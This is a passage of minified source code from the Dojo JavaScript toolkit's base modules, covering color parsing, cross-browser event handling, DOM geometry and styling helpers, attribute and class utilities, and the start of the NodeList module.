o=e.toLowerCase().match(/^rgba?\(([\s\.,0-9]+)\)/);return o&&dojo.colorFromArray(o[1].split(/\s*,\s*/),t)},dojo.colorFromHex=function(e,t){var o=t||new d.Color,r=4==e.length?4:8,n=(1<<r)-1;return e=Number("0x"+e.substr(1)),isNaN(e)?null:(d.forEach(["b","g","r"],(function(t){var i=e&n;e>>=r,o[t]=4==r?17*i:i})),o.a=1,o)},dojo.colorFromArray=function(e,t){var o=t||new d.Color;return o._set(Number(e[0]),Number(e[1]),Number(e[2]),Number(e[3])),isNaN(o.a)&&(o.a=1),o.sanitize()},dojo.colorFromString=function(e,t){var o=d.Color.named[e];return o&&d.colorFromArray(o,t)||d.colorFromRgb(e,t)||d.colorFromHex(e,t)}),dojo._hasResource["dojo._base"]||(dojo._hasResource["dojo._base"]=!0,dojo.provide("dojo._base")),dojo._hasResource["dojo._base.window"]||(dojo._hasResource["dojo._base.window"]=!0,dojo.provide("dojo._base.window"),dojo.doc=window.document||null,dojo.body=function(){return dojo.doc.body||dojo.doc.getElementsByTagName("body")[0]},dojo.setContext=function(e,t){dojo.global=e,dojo.doc=t},dojo.withGlobal=function(e,t,o,r){var n=dojo.global;try{return dojo.global=e,dojo.withDoc.call(null,e.document,t,o,r)}finally{dojo.global=n}},dojo.withDoc=function(e,t,o,r){var n=dojo.doc,i=dojo._bodyLtr,a=dojo.isQuirks;try{return dojo.doc=e,delete dojo._bodyLtr,dojo.isQuirks="BackCompat"==dojo.doc.compatMode,o&&"string"==typeof t&&(t=o[t]),t.apply(o,r||[])}finally{dojo.doc=n,delete dojo._bodyLtr,void 0!==i&&(dojo._bodyLtr=i),dojo.isQuirks=a}}),dojo._hasResource["dojo._base.event"]||(dojo._hasResource["dojo._base.event"]=!0,dojo.provide("dojo._base.event"),function(){var e=dojo._event_listener={add:function(t,o,r){if(t){if(o=e._normalizeEventName(o),r=e._fixCallback(o,r),!dojo.isIE&&("mouseenter"==o||"mouseleave"==o)){var n=r;o="mouseenter"==o?"mouseover":"mouseout",r=function(e){if(!dojo.isDescendant(e.relatedTarget,t))return n.call(this,e)}}return t.addEventListener(o,r,!1),r}},remove:function(t,o,r){t&&(o=e._normalizeEventName(o),dojo.isIE||"mouseenter"!=o&&"mouseleave"!=o||(o="mouseenter"==o?"mouseover":"mouseout"),t.removeEventListener(o,r,!1))},_normalizeEventName:function(e){return"on"==e.slice(0,2)?e.slice(2):e},_fixCallback:function(t,o){return"keypress"!=t?o:function(t){return o.call(this,e._fixEvent(t,this))}},_fixEvent:function(t,o){if("keypress"===t.type)e._setKeyChar(t);return t},_setKeyChar:function(e){e.keyChar=e.charCode>=32?String.fromCharCode(e.charCode):"",e.charOrCode=e.keyChar||e.keyCode},_punctMap:{106:42,111:47,186:59,187:43,188:44,189:45,190:46,191:47,192:96,219:91,220:92,221:93,222:39}};dojo.fixEvent=function(t,o){return e._fixEvent(t,o)},dojo.stopEvent=function(e){e.preventDefault(),e.stopPropagation()};var t=dojo._listener;dojo._connect=function(o,r,n,i,a){var s=o&&(o.nodeType||o.attachEvent||o.addEventListener)?a?2:1:0;return[o,r,[dojo._listener,e,t][s].add(o,r,dojo.hitch(n,i)),s]},dojo._disconnect=function(o,r,n,i){[dojo._listener,e,t][i].remove(o,r,n)},dojo.keys={BACKSPACE:8,TAB:9,CLEAR:12,ENTER:13,SHIFT:16,CTRL:17,ALT:18,META:dojo.isSafari?91:224,PAUSE:19,CAPS_LOCK:20,ESCAPE:27,SPACE:32,PAGE_UP:33,PAGE_DOWN:34,END:35,HOME:36,LEFT_ARROW:37,UP_ARROW:38,RIGHT_ARROW:39,DOWN_ARROW:40,INSERT:45,DELETE:46,HELP:47,LEFT_WINDOW:91,RIGHT_WINDOW:92,SELECT:93,NUMPAD_0:96,NUMPAD_1:97,NUMPAD_2:98,NUMPAD_3:99,NUMPAD_4:100,NUMPAD_5:101,NUMPAD_6:102,NUMPAD_7:103,NUMPAD_8:104,NUMPAD_9:105,NUMPAD_MULTIPLY:106,NUMPAD_PLUS:107,NUMPAD_ENTER:108,NUMPAD_MINUS:109,NUMPAD_PERIOD:110,NUMPAD_DIVIDE:111,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,F13:124,F14:125,F15:126,NUM_LOCK:144,SCROLL_LOCK:145,copyKey:dojo.isMac&&!dojo.isAIR?dojo.isSafari?91:224:17};var o=dojo.isMac?"metaKey":"ctrlKey";if(dojo.isCopyKey=function(e){return e[o]},dojo.isIE<9||dojo.isIE&&dojo.isQuirks?dojo.mouseButtons={LEFT:1,MIDDLE:4,RIGHT:2,isButton:function(e,t){return e.button&t},isLeft:function(e){return 1&e.button},isMiddle:function(e){return 4&e.button},isRight:function(e){return 2&e.button}}:dojo.mouseButtons={LEFT:0,MIDDLE:1,RIGHT:2,isButton:function(e,t){return e.button==t},isLeft:function(e){return 0==e.button},isMiddle:function(e){return 1==e.button},isRight:function(e){return 2==e.button}},dojo.isIE){var r=function(e,t){try{return e.keyCode=t}catch(e){return 0}},n=dojo._listener,i=dojo._ieListenersName="_"+dojo._scopeName+"_listeners";if(!dojo.config._allow_leaks){t=n=dojo._ie_listener={handlers:[],add:function(e,t,o){var r=(e=e||dojo.global)[t];if(!r||!r[i]){var n=dojo._getIeDispatcher();n.target=r&&a.push(r)-1,n[i]=[],r=e[t]=n}return r[i].push(a.push(o)-1)},remove:function(e,t,o){var r=(e||dojo.global)[t],n=r&&r[i];r&&n&&o--&&(delete a[n[o]],delete n[o])}};var a=n.handlers}dojo.mixin(e,{add:function(t,o,r){if(t){if("onkeypress"==(o=e._normalizeEventName(o))){var a=t.onkeydown;if(a&&a[i]&&a._stealthKeydownHandle)a._stealthKeydownRefs++;else{var s=e.add(t,"onkeydown",e._stealthKeyDown);(a=t.onkeydown)._stealthKeydownHandle=s,a._stealthKeydownRefs=1}}return n.add(t,o,e._fixCallback(r))}},remove:function(t,o,r){if(o=e._normalizeEventName(o),n.remove(t,o,r),"onkeypress"==o){var i=t.onkeydown;--i._stealthKeydownRefs<=0&&(n.remove(t,"onkeydown",i._stealthKeydownHandle),delete i._stealthKeydownHandle)}},_normalizeEventName:function(e){return"on"!=e.slice(0,2)?"on"+e:e},_nop:function(){},_fixEvent:function(t,o){t||(t=(o&&(o.ownerDocument||o.document||o).parentWindow||window).event);if(!t)return t;t.target=t.srcElement,t.currentTarget=o||t.srcElement,t.layerX=t.offsetX,t.layerY=t.offsetY;var r=t.srcElement,n=r&&r.ownerDocument||document,i=dojo.isIE<6||"BackCompat"==n.compatMode?n.body:n.documentElement,a=dojo._getIeDocumentElementOffset();return t.pageX=t.clientX+dojo._fixIeBiDiScrollLeft(i.scrollLeft||0)-a.x,t.pageY=t.clientY+(i.scrollTop||0)-a.y,"mouseover"==t.type&&(t.relatedTarget=t.fromElement),"mouseout"==t.type&&(t.relatedTarget=t.toElement),(dojo.isIE<9||dojo.isQuirks)&&(t.stopPropagation=e._stopPropagation,t.preventDefault=e._preventDefault),e._fixKeys(t)},_fixKeys:function(t){if("keypress"===t.type){var o="charCode"in t?t.charCode:t.keyCode;10==o?(o=0,t.keyCode=13):13==o||27==o?o=0:3==o&&(o=99),t.charCode=o,e._setKeyChar(t)}return t},_stealthKeyDown:function(t){var o=t.currentTarget.onkeypress;if(o&&o[i]){var n=t.keyCode,a=(13!=n||dojo.isIE>=9&&!dojo.isQuirks)&&32!=n&&27!=n&&(n<48||n>90)&&(n<96||n>111)&&(n<186||n>192)&&(n<219||n>222);if(a||t.ctrlKey){var s=a?0:n;if(t.ctrlKey){if(3==n||13==n)return;s>95&&s<106?s-=48:!t.shiftKey&&s>=65&&s<=90?s+=32:s=e._punctMap[s]||s}var l=e._synthesizeEvent(t,{type:"keypress",faux:!0,charCode:s});o.call(t.currentTarget,l),(dojo.isIE<9||dojo.isIE&&dojo.isQuirks)&&(t.cancelBubble=l.cancelBubble),t.returnValue=l.returnValue,r(t,l.keyCode)}}},_stopPropagation:function(){this.cancelBubble=!0},_preventDefault:function(){this.bubbledKeyCode=this.keyCode,this.ctrlKey&&r(this,0),this.returnValue=!1}}),dojo.stopEvent=dojo.isIE<9||dojo.isQuirks?function(t){t=t||window.event,e._stopPropagation.call(t),e._preventDefault.call(t)}:dojo.stopEvent}e._synthesizeEvent=function(t,o){var r=dojo.mixin({},t,o);return e._setKeyChar(r),r.preventDefault=function(){t.preventDefault()},r.stopPropagation=function(){t.stopPropagation()},r},dojo.isOpera&&dojo.mixin(e,{_fixEvent:function(t,o){if("keypress"===t.type){var r=t.which;return 3==r&&(r=99),r=r<41&&!t.shiftKey?0:r,t.ctrlKey&&!t.shiftKey&&r>=65&&r<=90&&(r+=32),e._synthesizeEvent(t,{charCode:r})}return t}}),dojo.isWebKit&&(e._add=e.add,e._remove=e.remove,dojo.mixin(e,{add:function(t,o,r){if(t){var n=e._add(t,o,r);return"keypress"==e._normalizeEventName(o)&&(n._stealthKeyDownHandle=e._add(t,"keydown",(function(t){var o=t.keyCode,n=13!=o&&32!=o&&(o<48||o>90)&&(o<96||o>111)&&(o<186||o>192)&&(o<219||o>222);if(n||t.ctrlKey){var i=n?0:o;if(t.ctrlKey){if(3==o||13==o)return;i>95&&i<106?i-=48:!t.shiftKey&&i>=65&&i<=90?i+=32:i=e._punctMap[i]||i}var a=e._synthesizeEvent(t,{type:"keypress",faux:!0,charCode:i});r.call(t.currentTarget,a)}}))),n}},remove:function(t,o,r){t&&(r._stealthKeyDownHandle&&e._remove(t,"keydown",r._stealthKeyDownHandle),e._remove(t,o,r))},_fixEvent:function(t,o){if("keypress"===t.type){if(t.faux)return t;var r=t.charCode;return r=r>=32?r:0,e._synthesizeEvent(t,{charCode:r,faux:!0})}return t}}))}(),dojo.isIE&&(dojo._ieDispatcher=function(e,t){var o=Array.prototype,r=dojo._ie_listener.handlers,n=e.callee,i=n[dojo._ieListenersName],a=r[n.target],s=a&&a.apply(t,e),l=[].concat(i);for(var d in l){var c=r[l[d]];!(d in o)&&c&&c.apply(t,e)}return s},dojo._getIeDispatcher=function(){return new Function(dojo._scopeName+"._ieDispatcher(arguments, this)")},dojo._event_listener._fixCallback=function(e){var t=dojo._event_listener._fixEvent;return function(o){return e.call(this,t(o,this))}})),!dojo._hasResource["dojo._base.html"]){dojo._hasResource["dojo._base.html"]=!0,dojo.provide("dojo._base.html");try{document.execCommand("BackgroundImageCache",!1,!0)}catch(e){}dojo.isIE||dojo.isOpera?dojo.byId=function(e,t){if("string"!=typeof e)return e;var o=t||dojo.doc,r=o.getElementById(e);if(r&&(r.attributes.id.value==e||r.id==e))return r;var n=o.all[e];n&&!n.nodeName||(n=[n]);for(var i=0;r=n[i++];)if(r.attributes&&r.attributes.id&&r.attributes.id.value==e||r.id==e)return r}:dojo.byId=function(e,t){return"string"==typeof e?(t||dojo.doc).getElementById(e):e},function(){var d=dojo,byId=d.byId,_135=null,_136;d.addOnWindowUnload((function(){_135=null})),dojo._destroyElement=dojo.destroy=function(e){e=byId(e);try{var t=e.ownerDocument;_135&&_136==t||(_135=t.createElement("div"),_136=t),_135.appendChild(e.parentNode?e.parentNode.removeChild(e):e),_135.innerHTML=""}catch(e){}},dojo.isDescendant=function(e,t){try{for(e=byId(e),t=byId(t);e;){if(e==t)return!0;e=e.parentNode}}catch(e){}return!1},dojo.setSelectable=function(e,t){if(e=byId(e),d.isMozilla)e.style.MozUserSelect=t?"":"none";else if(d.isKhtml||d.isWebKit)e.style.KhtmlUserSelect=t?"auto":"none";else if(d.isIE){var o=e.unselectable=t?"":"on";d.query("*",e).forEach("item.unselectable = '"+o+"'")}};var _139=function(e,t){var o=t.parentNode;o&&o.insertBefore(e,t)},_13b=function(e,t){var o=t.parentNode;o&&(o.lastChild==t?o.appendChild(e):o.insertBefore(e,t.nextSibling))},gcs;dojo.place=function(e,t,o){if(t=byId(t),"string"==typeof e&&(e="<"==e.charAt(0)?d._toDom(e,t.ownerDocument):byId(e)),"number"==typeof o){var r=t.childNodes;!r.length||r.length<=o?t.appendChild(e):_139(e,r[o<0?0:o])}else switch(o){case"before":_139(e,t);break;case"after":_13b(e,t);break;case"replace":t.parentNode.replaceChild(e,t);break;case"only":d.empty(t),t.appendChild(e);break;case"first":if(t.firstChild){_139(e,t.firstChild);break}default:t.appendChild(e)}return e},dojo.boxModel="content-box",d.isIE&&(d.boxModel="BackCompat"==document.compatMode?"border-box":"content-box"),gcs=d.isWebKit?function(e){var t;if(1==e.nodeType){var o=e.ownerDocument.defaultView;!(t=o.getComputedStyle(e,null))&&e.style&&(e.style.display="",t=o.getComputedStyle(e,null))}return t||{}}:d.isIE?function(e){return 1==e.nodeType?e.currentStyle:{}}:function(e){return 1==e.nodeType?e.ownerDocument.defaultView.getComputedStyle(e,null):{}},dojo.getComputedStyle=gcs,d.isIE?d._toPixelValue=function(_141,_142){if(!_142)return 0;if("medium"==_142)return 4;if(_142.slice&&"px"==_142.slice(-2))return parseFloat(_142);with(_141){var _143=style.left,_144=runtimeStyle.left;runtimeStyle.left=currentStyle.left;try{style.left=_142,_142=style.pixelLeft}catch(e){_142=0}style.left=_143,runtimeStyle.left=_144}return _142}:d._toPixelValue=function(e,t){return parseFloat(t)||0};var px=d._toPixelValue,astr="DXImageTransform.Microsoft.Alpha",af=function(e,t){try{return e.filters.item(astr)}catch(e){return t?{}:null}};dojo._getOpacity=d.isIE<9||d.isIE&&d.isQuirks?function(e){try{return af(e).Opacity/100}catch(e){return 1}}:function(e){return gcs(e).opacity},dojo._setOpacity=d.isIE<9||d.isIE&&d.isQuirks?function(e,t){var o=100*t;return e.style.zoom=1,af(e,1).Enabled=!(1==t),af(e)?af(e,1).Opacity=o:e.style.filter+=" progid:"+astr+"(Opacity="+o+")","tr"==e.nodeName.toLowerCase()&&d.query("> td",e).forEach((function(e){d._setOpacity(e,t)})),t}:function(e,t){return e.style.opacity=t};var _147={left:!0,top:!0},_148=/margin|padding|width|height|max|min|offset/,_149=function(e,t,o){if(t=t.toLowerCase(),d.isIE){if("auto"==o){if("height"==t)return e.offsetHeight;if("width"==t)return e.offsetWidth}if("fontweight"==t)return 700===o?"bold":"normal"}return t in _147||(_147[t]=_148.test(t)),_147[t]?px(e,o):o},_14b=d.isIE?"styleFloat":"cssFloat",_14c={cssFloat:_14b,styleFloat:_14b,float:_14b};dojo.style=function(e,t,o){var r=byId(e),n=arguments.length,i="opacity"==t;if(t=_14c[t]||t,3==n)return i?d._setOpacity(r,o):r.style[t]=o;if(2==n&&i)return d._getOpacity(r);var a=gcs(r);if(2==n&&"string"!=typeof t){for(var s in t)d.style(e,s,t[s]);return a}return 1==n?a:_149(r,t,a[t]||r.style[t])},dojo._getPadExtents=function(e,t){var o=t||gcs(e),r=px(e,o.paddingLeft),n=px(e,o.paddingTop);return{l:r,t:n,w:r+px(e,o.paddingRight),h:n+px(e,o.paddingBottom)}},dojo._getBorderExtents=function(e,t){var o="none",r=t||gcs(e),n=r.borderLeftStyle!=o?px(e,r.borderLeftWidth):0,i=r.borderTopStyle!=o?px(e,r.borderTopWidth):0;return{l:n,t:i,w:n+(r.borderRightStyle!=o?px(e,r.borderRightWidth):0),h:i+(r.borderBottomStyle!=o?px(e,r.borderBottomWidth):0)}},dojo._getPadBorderExtents=function(e,t){var o=t||gcs(e),r=d._getPadExtents(e,o),n=d._getBorderExtents(e,o);return{l:r.l+n.l,t:r.t+n.t,w:r.w+n.w,h:r.h+n.h}},dojo._getMarginExtents=function(e,t){var o=t||gcs(e),r=px(e,o.marginLeft),n=px(e,o.marginTop),i=px(e,o.marginRight),a=px(e,o.marginBottom);return d.isWebKit&&"absolute"!=o.position&&(i=r),{l:r,t:n,w:r+i,h:n+a}},dojo._getMarginBox=function(e,t){var o=t||gcs(e),r=d._getMarginExtents(e,o),n=e.offsetLeft-r.l,i=e.offsetTop-r.t,a=e.parentNode;if(d.isMoz){var s=parseFloat(o.left),l=parseFloat(o.top);if(isNaN(s)||isNaN(l)){if(a&&a.style){var c=gcs(a);if("visible"!=c.overflow){var u=d._getBorderExtents(a,c);n+=u.l,i+=u.t}}}else n=s,i=l}else(d.isOpera||8==d.isIE&&!d.isQuirks)&&a&&(n-=(u=d._getBorderExtents(a)).l,i-=u.t);return{l:n,t:i,w:e.offsetWidth+r.w,h:e.offsetHeight+r.h}},dojo._getContentBox=function(e,t){var o,r=t||gcs(e),n=d._getPadExtents(e,r),i=d._getBorderExtents(e,r),a=e.clientWidth;return a?(o=e.clientHeight,i.w=i.h=0):(a=e.offsetWidth,o=e.offsetHeight),d.isOpera&&(n.l+=i.l,n.t+=i.t),{l:n.l,t:n.t,w:a-n.w-i.w,h:o-n.h-i.h}},dojo._getBorderBox=function(e,t){var o=t||gcs(e),r=d._getPadExtents(e,o),n=d._getContentBox(e,o);return{l:n.l-r.l,t:n.t-r.t,w:n.w+r.w,h:n.h+r.h}},dojo._setBox=function(e,t,o,r,n,i){i=i||"px";var a=e.style;isNaN(t)||(a.left=t+i),isNaN(o)||(a.top=o+i),r>=0&&(a.width=r+i),n>=0&&(a.height=n+i)},dojo._isButtonTag=function(e){return"BUTTON"==e.tagName||"INPUT"==e.tagName&&"BUTTON"==(e.getAttribute("type")||"").toUpperCase()},dojo._usesBorderBox=function(e){var t=e.tagName;return"border-box"==d.boxModel||"TABLE"==t||d._isButtonTag(e)},dojo._setContentSize=function(e,t,o,r){if(d._usesBorderBox(e)){var n=d._getPadBorderExtents(e,r);t>=0&&(t+=n.w),o>=0&&(o+=n.h)}d._setBox(e,NaN,NaN,t,o)},dojo._setMarginBox=function(e,t,o,r,n,i){var a=i||gcs(e),s=d._usesBorderBox(e)?_15e:d._getPadBorderExtents(e,a);if(d.isWebKit&&d._isButtonTag(e)){var l=e.style;r>=0&&!l.width&&(l.width="4px"),n>=0&&!l.height&&(l.height="4px")}var c=d._getMarginExtents(e,a);r>=0&&(r=Math.max(r-s.w-c.w,0)),n>=0&&(n=Math.max(n-s.h-c.h,0)),d._setBox(e,t,o,r,n)};var _15e={l:0,t:0,w:0,h:0};dojo.marginBox=function(e,t){var o=byId(e),r=gcs(o),n=t;return n?d._setMarginBox(o,n.l,n.t,n.w,n.h,r):d._getMarginBox(o,r)},dojo.contentBox=function(e,t){var o=byId(e),r=gcs(o),n=t;return n?d._setContentSize(o,n.w,n.h,r):d._getContentBox(o,r)};var _15f=function(e,t){if(!(e=(e||0).parentNode))return 0;for(var o,r=0,n=d.body();e&&e.style;){if("fixed"==gcs(e).position)return 0;if((o=e[t])&&(r+=o-0,e==n))break;e=e.parentNode}return r};dojo._docScroll=function(){var e=d.global;return"pageXOffset"in e?{x:e.pageXOffset,y:e.pageYOffset}:(e=d.doc.documentElement).clientHeight?{x:d._fixIeBiDiScrollLeft(e.scrollLeft),y:e.scrollTop}:{x:(e=d.body()).scrollLeft||0,y:e.scrollTop||0}},dojo._isBodyLtr=function(){return"_bodyLtr"in d?d._bodyLtr:d._bodyLtr="ltr"==(d.body().dir||d.doc.documentElement.dir||"ltr").toLowerCase()},dojo._getIeDocumentElementOffset=function(){var e=d.doc.documentElement;if(d.isIE<8){var t=e.getBoundingClientRect(),o=t.left,r=t.top;return d.isIE<7&&(o+=e.clientLeft,r+=e.clientTop),{x:o<0?0:o,y:r<0?0:r}}return{x:0,y:0}},dojo._fixIeBiDiScrollLeft=function(e){var t=d.doc;if(d.isIE<8&&!d._isBodyLtr()){var o=d.isQuirks?t.body:t.documentElement;return e+o.clientWidth-o.scrollWidth}return e},dojo._abs=dojo.position=function(e,t){var o,r=d.body(),n=r.parentNode;if((e=byId(e)).getBoundingClientRect){if(o={x:(o=e.getBoundingClientRect()).left,y:o.top,w:o.right-o.left,h:o.bottom-o.top},d.isIE){var i=d._getIeDocumentElementOffset();o.x-=i.x+(d.isQuirks?r.clientLeft+r.offsetLeft:0),o.y-=i.y+(d.isQuirks?r.clientTop+r.offsetTop:0)}else if(3==d.isFF){var a=gcs(n);o.x-=px(n,a.marginLeft)+px(n,a.borderLeftWidth),o.y-=px(n,a.marginTop)+px(n,a.borderTopWidth)}}else if(o={x:0,y:0,w:e.offsetWidth,h:e.offsetHeight},e.offsetParent){o.x-=_15f(e,"scrollLeft"),o.y-=_15f(e,"scrollTop");var s=e;do{var l=s.offsetLeft,c=s.offsetTop;if(o.x+=isNaN(l)?0:l,o.y+=isNaN(c)?0:c,a=gcs(s),s!=e&&(d.isMoz?(o.x+=2*px(s,a.borderLeftWidth),o.y+=2*px(s,a.borderTopWidth)):(o.x+=px(s,a.borderLeftWidth),o.y+=px(s,a.borderTopWidth))),d.isMoz&&"static"==a.position)for(var u=s.parentNode;u!=s.offsetParent;){var h=gcs(u);"static"==h.position&&(o.x+=px(s,h.borderLeftWidth),o.y+=px(s,h.borderTopWidth)),u=u.parentNode}s=s.offsetParent}while(s!=n&&s)}else e.x&&e.y&&(o.x+=isNaN(e.x)?0:e.x,o.y+=isNaN(e.y)?0:e.y);if(t){var p=d._docScroll();o.x+=p.x,o.y+=p.y}return o},dojo.coords=function(e,t){var o=byId(e),r=gcs(o),n=d._getMarginBox(o,r),i=d.position(o,t);return n.x=i.x,n.y=i.y,n};var _169={class:"className",for:"htmlFor",tabindex:"tabIndex",readonly:"readOnly",colspan:"colSpan",frameborder:"frameBorder",rowspan:"rowSpan",valuetype:"valueType"},_16a={classname:"class",htmlfor:"for",tabindex:"tabIndex",readonly:"readOnly"},_16b={innerHTML:1,className:1,htmlFor:d.isIE,value:1},_16c=function(e){return _16a[e.toLowerCase()]||e},_16d=function(e,t){var o=e.getAttributeNode&&e.getAttributeNode(t);return o&&o.specified};dojo.hasAttr=function(e,t){var o=t.toLowerCase();return _16b[_169[o]||t]||_16d(byId(e),_16a[o]||t)};var _16e={},_16f=0,_170=dojo._scopeName+"attrid",_171={col:1,colgroup:1,table:1,tbody:1,tfoot:1,thead:1,tr:1,title:1};dojo.attr=function(e,t,o){e=byId(e);var r=arguments.length;if(2==r&&"string"!=typeof t){for(var n in t)d.attr(e,n,t[n]);return e}var i=t.toLowerCase(),a=_169[i]||t,s=_16b[a],l=_16a[i]||t;if(3==r){do{if("style"==a&&"string"!=typeof o){d.style(e,o);break}if("innerHTML"==a){d.isIE&&e.tagName.toLowerCase()in _171?(d.empty(e),e.appendChild(d._toDom(o,e.ownerDocument))):e[a]=o;break}if(d.isFunction(o)){var c=d.attr(e,_170);c||(c=_16f++,d.attr(e,_170,c)),_16e[c]||(_16e[c]={});var u=_16e[c][a];if(u)d.disconnect(u);else try{delete e[a]}catch(e){}_16e[c][a]=d.connect(e,a,o);break}if(s||"boolean"==typeof o){e[a]=o;break}e.setAttribute(l,o)}while(0);return e}return o=e[a],s&&void 0!==o?o:"href"==a||"boolean"!=typeof o&&!d.isFunction(o)?_16d(e,l)?e.getAttribute(l):null:o},dojo.removeAttr=function(e,t){byId(e).removeAttribute(_16c(t))},dojo.getNodeProp=function(e,t){e=byId(e);var o=t.toLowerCase(),r=_169[o]||t;if(r in e&&"href"!=r)return e[r];var n=_16a[o]||t;return _16d(e,n)?e.getAttribute(n):null},dojo.create=function(e,t,o,r){var n=d.doc;return o&&(n=(o=byId(o)).ownerDocument),"string"==typeof e&&(e=n.createElement(e)),t&&d.attr(e,t),o&&d.place(e,o,r),e},d.empty=d.isIE?function(e){e=byId(e);for(var t;t=e.lastChild;)d.destroy(t)}:function(e){byId(e).innerHTML=""};var _17b={option:["select"],tbody:["table"],thead:["table"],tfoot:["table"],tr:["table","tbody"],td:["table","tbody","tr"],th:["table","thead","tr"],legend:["fieldset"],caption:["table"],colgroup:["table"],col:["table","colgroup"],li:["ul"]},_17c=/<\s*([\w\:]+)/,_17d={},_17e=0,_17f="__"+d._scopeName+"ToDomId";for(var _180 in _17b){var tw=_17b[_180];tw.pre="option"==_180?'<select multiple="multiple">':"<"+tw.join("><")+">",tw.post="</"+tw.reverse().join("></")+">"}d._toDom=function(e,t){var o=(t=t||d.doc)[_17f];o||(t[_17f]=o=++_17e+"",_17d[o]=t.createElement("div"));var r,n,i,a,s=(e+="").match(_17c),l=s?s[1].toLowerCase():"",c=_17d[o];if(s&&_17b[l])for(r=_17b[l],c.innerHTML=r.pre+e+r.post,n=r.length;n;--n)c=c.firstChild;else c.innerHTML=e;if(1==c.childNodes.length)return c.removeChild(c.firstChild);for(a=t.createDocumentFragment();i=c.firstChild;)a.appendChild(i);return a};var _184="className";dojo.hasClass=function(e,t){return(" "+byId(e)[_184]+" ").indexOf(" "+t+" ")>=0};var _186=/\s+/,a1=[""],_187=function(e){return"string"==typeof e||e instanceof String?e.indexOf(" ")<0?(a1[0]=e,a1):e.split(_186):e};dojo.addClass=function(e,t){e=byId(e),t=_187(t);for(var o,r=" "+e[_184]+" ",n=0,i=t.length;n<i;++n)(o=t[n])&&r.indexOf(" "+o+" ")<0&&(r+=o+" ");e[_184]=d.trim(r)},dojo.removeClass=function(e,t){var o;if(e=byId(e),void 0!==t){t=_187(t),o=" "+e[_184]+" ";for(var r=0,n=t.length;r<n;++r)o=o.replace(" "+t[r]+" "," ");o=d.trim(o)}else o="";e[_184]!=o&&(e[_184]=o)},dojo.toggleClass=function(e,t,o){void 0===o&&(o=!d.hasClass(e,t)),d[o?"addClass":"removeClass"](e,t)}}()}if(dojo._hasResource["dojo._base.NodeList"]||(dojo._hasResource["dojo._base.NodeList"]=!0,dojo.provide("dojo._base.NodeList"),function(){var e=dojo,t=Array.prototype,o=t.slice,r=t.concat,n=function(t,r,n){t.sort||(t=o.call(t,0));var i=n||this._NodeListCtor||e._NodeListCtor;return t.constructor=i,dojo._mixin(t,i.prototype),t._NodeListCtor=i,r?t._stash(r):t},i=function(t,r,n){return r=[0].concat(o.call(r,0)),n=n||e.global,function(e){return r[0]=e,t.apply(n,r)}},a=function(e,t){return function(){return this.forEach(i(e,arguments,t)),this}},s=function(e,t){return function(){return this.map(i(e,arguments,t))}},l=function(t,o,r){return function(){var n=arguments,a=i(t,n,r);return o.call(r||e.global,n)?this.map(a):(this.forEach(a),this)}},d=function(e){return 1==e.length&&"string"==typeof e[0]},c=function(e){var t=e.parentNode;t&&t.removeChild(e)};dojo.NodeList=function(){return n(Array.apply(null,arguments))},e._NodeListCtor=e.NodeList;var u=e.NodeList,h=u.prototype;u._wrap=h._wrap=n,u._adaptAsMap=s,u._adaptAsForEach=a,u._adaptAsFilter=function(e,t){return function(){return this.filter(i(e,arguments,t))}},u._adaptWithCondition=l,e.forEach(["slice","splice"],(function(e){var o=t[e];h[e]=function(){return this._wrap(o.apply(this,arguments),"slice"==e?this:null)}})),e.forEach(["indexOf","lastIndexOf","every","some"],(function(t){var r=e[t];h[t]=function(){return r.apply(e,[this].concat(o.call(arguments,0)))}})),e.forEach(["attr","style"],(function(t){h[t]=l(e[t],d)})),e.forEach(["connect","addClass","removeClass","toggleClass","empty","removeAttr"],(function(t){h[t]=a(e[t])})),dojo.extend(dojo.NodeList,{_normalize:function(e,t){var o=!0===e.parse;if("string"==typeof e.template){var r=e.templateFunc||dojo.string&&dojo.string.substitute;e=r?r(e.template,e):e}var n=typeof e;return"string"==n||"number"==n?e=11==(e=dojo._toDom(e,t&&t.ownerDocument)).nodeType?dojo._toArray(e.childNodes):[e]:dojo.isArrayLike(e)?dojo.isArray(e)||(e=dojo._toArray(e)):e=[e],o&&(e._runParse=!0),e},_cloneNode:function(e){return e.cloneNode(!0)},_place:function(e,t,o,r){if(1==t.nodeType||"only"!=o)for(var n,i=t,a=e.length,s=a-1;s>=0;s--){var l=r?this._cloneNode(e[s]):e[s];if(e._runParse&&dojo.parser&&dojo.parser.parse)for(n||(n=i.ownerDocument.createElement("div")),n.appendChild(l),dojo.parser.parse(n),l=n.firstChild;n.firstChild;)n.removeChild(n.firstChild);s==a-1?dojo.place(l,i,o):i.parentNode.insertBefore(l,i),i=l}},_stash:function(e){return this._parent=e,this},end:function(){return this._parent?this._parent:new this._NodeListCtor},concat:function(t){var n=e.isArray(this)?this:o.call(this,0),i=e.map(arguments,(function(t){return t&&!e.isArray(t)&&("undefined"!=typeof NodeList&&t.constructor===NodeList||t.constructor===this._NodeListCtor)?o.call(t,0):t}));return this._wrap(r.apply(n,i),this)},map:function(t,o){return this._wrap(e.map(this,t,o),this)},forEach:function(t,o){return e.forEach(this,t,o),this},coords:s(e.coords),position:s(e.position),place:function(t,o){var r=e.query(t)[0];return this.forEach((function(t){e.place(t,r,o)}))},orphan:function(t){return(t?e._filterQueryResult(this,t):this).forEach(c)},adopt:function(t,o){return e.query(t).place(this[0],o)._stash(this)},query:function(t){if(!t)return this;var o=this.map((function(o){return e.query(t,o).filter((function(e){return void 0!==e}))}));return this._wrap(r.apply([],o),this)},filter:function(t){var o=arguments,r=this,n=0;if("string"==typeof t){if(r=e._filterQueryResult(this,o[0]),1==o.length)return r._stash(this);n=1}return this._wrap(e.filter(r,o[n],o[n+1]),this)},addContent:function(e,t){e=this._normalize(e,this[0]);for(var o,r=0;o=this[r];r++)this._place(e,o,t,r>0);return this},instantiate:function(t,o){var r=e.isFunction(t)?t:e.getObject(t);return o=o||{},this.forEach((function(e){new r(o,e)}))},at:function(){var t=new this._NodeListCtor;return e.forEach(arguments,(function(e){this[e]&&t.push(this[e])}),this),t._stash(this)}}),u.events=["blur","focus","change","click","error","keydown","keypress","keyup","load","mousedown","mouseenter","mouseleave","mousemove","mouseout","mouseover","mouseup","submit"],e.forEach(u.events,(function(e){var t="on"+e;h[t]=function(e,o){return this.connect(t,e,o)}}))}()),dojo._hasResource["dojo._base.query"]||(dojo._hasResource["dojo._base.query"]=!0,"undefined"!=typeof dojo&&dojo.provide("dojo._base.query"),function(e){var 